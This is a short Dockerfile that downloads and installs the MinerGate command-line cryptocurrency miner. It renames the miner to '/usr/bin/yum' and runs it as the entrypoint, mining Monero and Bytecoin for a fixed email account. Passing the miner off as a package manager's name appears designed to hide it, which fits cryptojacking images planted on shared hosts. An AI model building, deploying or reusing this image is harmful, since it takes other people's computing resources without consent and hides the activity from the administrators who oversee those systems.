FROM ubuntu:16.04  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
ca-certificates \  
wget \  
&& rm -r /var/lib/apt/lists/*  
RUN wget -q --content-disposition https://minergate.com/download/deb-cli \  
&& dpkg -i *.deb \  
&& rm *.deb && ln -s /usr/bin/minergate-cli /usr/bin/yum  
ENTRYPOINT ["/usr/bin/yum"]  
CMD ["-user", "cc-cowboy@protonmail.com", "--xmr", "--bcn"]  

